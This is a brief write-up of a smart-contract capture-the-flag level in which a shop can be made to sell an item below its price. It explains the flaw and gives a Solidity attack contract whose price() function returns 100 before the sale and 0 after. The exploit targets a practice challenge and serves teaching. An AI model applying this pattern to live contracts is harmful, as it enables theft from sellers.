# Requirements

- Get the item from the shop for less than the price asked

# Attack explanation

We can control the address from which the Buyer instance is created.

What we are going to do is to create our own Buyer contract and implement price following a similar structure but different behaviour. To solve the challenge, we must make the function return a lower price than the shop.

# Attack function

We could solve the challenge by just using the following attack proxy sc:

```
contract FakeShop is Buyer{
    function attack(address vulnerableScAddress) public {
        vulnerableScAddress.call(abi.encodeWithSignature("buy()"));
    }

    function price() external view override returns (uint256) {
        bool isSold = Shop(msg.sender).isSold();
        if(!isSold) {
            return 100;
        }
        return 0;
    }
}
```
